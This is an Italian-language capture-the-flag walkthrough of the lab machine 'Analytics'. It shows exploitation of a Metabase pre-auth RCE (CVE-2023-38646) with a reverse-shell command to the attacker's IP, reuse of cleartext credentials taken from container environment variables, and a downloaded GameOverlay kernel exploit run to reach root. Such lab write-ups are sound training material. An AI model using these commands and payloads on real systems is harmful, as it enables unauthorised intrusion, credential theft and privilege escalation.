---
title: "Analytics Walkthrough"
description: "Analytics è una macchina Linux di difficoltà easy con servizi HTTP e SSH esposti. L'enumerazione del sito web rivela un'istanza di Metabase, vulnerabile a una Remote Code Execution in fase Pre-Autenticazione ([CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)), sfruttata per ottenere un punto d'appoggio (foothold) all'interno di un container Docker. Enumerando il container, si osservano variabili d'ambiente contenenti credenziali utilizzabili per accedere via SSH all'host. L'enumerazione post-exploitation rivela che la versione del kernel dell'host è vulnerabile a GameOverlay, sfruttata per ottenere i privilegi di root."
author: dua2z3rr
date: 2025-08-04 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Common Applications", "Area di Interesse: Basic Authentication and Authorization", "Area di Interesse: Software and OS exploitation", "Area di Interesse: Authentication", "Area di Interesse: Web Application", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Clear Text Credentials", "Vulnerabilità: Information Disclosure", "Vulnerabilità: Insecure Design", "Codice: Bash", "Servizio: Docker", "Servizio: Metabase", "Tecnica: Reconnaissance", "Tecnica: Configuration Analysis", "Tecnica: Password Reuse", "Tecnica: Kernel Exploitation", "Tecnica: API Abuse", "Tecnica: Linux Capabilities"]
image: /assets/img/analytics/box-analytics-logo-resized.png
---

## Enumerazione Esterna

### Nmap

Come sempre partiamo con un nmap:

```shell
nmap -vv -sC -sV -oA analytics 10.10.11.233
Nmap scan report for 10.10.11.233
Host is up, received syn-ack (0.071s latency).
Scanned at 2025-08-02 12:32:57 CEST for 14s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Aggiungiamo il dominio della porta 80 al file /etc/hosts:

```shell
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.233    analytical.htb
```

Mettiamo in background ffuf per trovare directory e subdomains mentre guardiamo il sito sulla porta 80.

```shell
ffuf -w /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u http://analytical.htb/FUZZ -ic

<SNIP>
```

```shell
ffuf -w /home/dua2z3rr/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.analytical.htb

<SNIP>
```

### HTTP

Ispezioniamo analytical.htb:

![Desktop View](/assets/img/analytics/analytcal-site.png)

Il sito è una pagina statica e non reindirizza ad altre pagine. Esiste un pulsante di login e cliccandolo, ancora prima del termine del fuzzing dei subdomains, data.analytical.htb

![Desktop View](/assets/img/analytics/trovato-nuovo-subdomain.png)

Procediamo a inserire questo subdomain nel file /etc/hosts.

```shell
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.233    analytical.htb  data.analytical.htb
```

Ricaricando la pagina, ci troviamo di fronte a una pagina di login di Metabase.

![Desktop View](/assets/img/analytics/metabase-login.png)

Andiamo sulla pagina di github per capire cosa è Metabase.

![Desktop View](/assets/img/analytics/metabase-github.png)

Iniziamo a cercare la versione di metabae visto che potrebbe aprirci a molte strade, come vulnerabilità già conosciute. sul source code della pagina troviamo la versione.

![Desktop View](/assets/img/analytics/versione-metabase.png)

## Exploitation

Adesso cerchiamo delle vulnerabilità note per metabase v0.46.6

![Desktop View](/assets/img/analytics/vulnerabilità1.png)

Questa sembrerebbe perfetta per il nostro caso. Mettiamo in gioco l'exploit.

```shell
git clone https://github.com/m3m0o/metabase-pre-auth-rce-poc.git

<SNIP>

wget http://data.analytical.htb/api/session/properties #token per l'exploit

<SNIP>

cat properties | jq | grep 'setup-token'
  "setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```

Utilizziamo l'exploit.

```shell
python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"
```

```shell
nc -lnvp 9001
```

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/Analytics/metabase-pre-auth-rce-poc]
└──╼ $python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "sh -i >& /dev/tcp/10.10.14.7/9001 0>&1"
[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]

[+] Initialized script
[+] Encoding command
[+] Making request
[+] Payload sent
```

Risultato:

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/Analytics]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.233 56390
sh: can't access tty; job control turned off
/ $ pwd
/
/ $ whoami
metabase
/ $ 
```

## Enumerazione interna

Fin da subito possiamo capire che ci troviamo all'intrno di un docker container grazie alla presenza del file .dockerenv

```shell
/ $ ls -al
total 92
drwxr-xr-x    1 root     root          4096 Aug  3 10:33 .
drwxr-xr-x    1 root     root          4096 Aug  3 10:33 ..
-rwxr-xr-x    1 root     root             0 Aug  3 10:33 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 29  2023 app
drwxr-xr-x    1 root     root          4096 Jun 29  2023 bin
drwxr-xr-x    5 root     root           340 Aug  3 10:33 dev
drwxr-xr-x    1 root     root          4096 Aug  3 10:33 etc
drwxr-xr-x    1 root     root          4096 Aug  3  2023 home
drwxr-xr-x    1 root     root          4096 Jun 14  2023 lib
drwxr-xr-x    5 root     root          4096 Jun 14  2023 media
drwxr-xr-x    1 metabase metabase      4096 Aug  3  2023 metabase.db
drwxr-xr-x    2 root     root          4096 Jun 14  2023 mnt
drwxr-xr-x    1 root     root          4096 Jun 15  2023 opt
drwxrwxrwx    1 root     root          4096 Aug  7  2023 plugins
dr-xr-xr-x  211 root     root             0 Aug  3 10:33 proc
drwx------    1 root     root          4096 Aug  3  2023 root
drwxr-xr-x    2 root     root          4096 Jun 14  2023 run
drwxr-xr-x    2 root     root          4096 Jun 14  2023 sbin
drwxr-xr-x    2 root     root          4096 Jun 14  2023 srv
dr-xr-xr-x   13 root     root             0 Aug  3 10:33 sys
drwxrwxrwt    1 root     root          4096 Aug  3  2023 tmp
drwxr-xr-x    1 root     root          4096 Jun 29  2023 usr
drwxr-xr-x    1 root     root          4096 Jun 14  2023 var
```

Controllando le variabili di ambiente troviamo:

```shell
/ $ printenv
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=8459cd7491f1
<SNIP>
META_PASS=An4lytics_ds20223#
<SNIP>
META_USER=metalytics
```

Accediamo tramite ssh utilizzando queste credenziali.

```shell
ssh metalytics@10.10.11.233
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233's password:
<SNIP>
metalytics@analytics:~$
```

Prendiamo la user flag.

## Privilege Escalation

### Identificazione Vulnerabilità

Cominciamo a enumerare informazioni sulla macchina. Controlliamo la versione del Kernel.

```shell
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

Controlliamo la release di ubuntu.

```shell
metalytics@analytics:~$ cat /etc/os-release 
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

Cerchiamo Vulnerabilità note.

![Desktop View](/assets/img/analytics/vulnerabilità2.png)

Questa fa al caso nostro.

### Exploitation

cloniamo la repository sulla nostra macchina locale e tramite `python3 -m http.server 8000` ci passiamo l'exploit.

```shell
metalytics@analytics:~/ciao$ wget http://10.10.14.7:8000/exploit.sh
--2025-08-03 20:58:20--  http://10.10.14.7:8000/exploit.sh
Connecting to 10.10.14.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                                      100%[=====================================================================================================>]     558  --.-KB/s    in 0s      

2025-08-03 20:58:20 (40.8 MB/s) - ‘exploit.sh’ saved [558/558]

metalytics@analytics:~/ciao$ ls -al
total 16
drwxrwxr-x 2 metalytics metalytics 4096 Aug  3 20:58 .
drwxr-x--- 5 metalytics metalytics 4096 Aug  3 20:54 ..
-rw-rw-r-- 1 metalytics metalytics  558 Aug  2 20:52 exploit.sh
-rw-rw-r-- 1 metalytics metalytics  310 Aug  3 20:57 index.html
metalytics@analytics:~/ciao$ chmod +x exploit.sh
metalytics@analytics:~/ciao$ ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:~/ciao# 
```

Andiamo nella home directory di root e prendiamo la flag.

## Conclusione

Analytics dimostra in modo efficace come la combinazione di vulnerabilità note e pratiche di sicurezza deboli possa portare a compromissioni complete di un sistema. Un approccio di difesa in profondità, con aggiornamenti regolari, hardening dei container e corretta gestione delle credenziali, è essenziale per prevenire compromissioni a catena come quella dimostrata in Analytics.
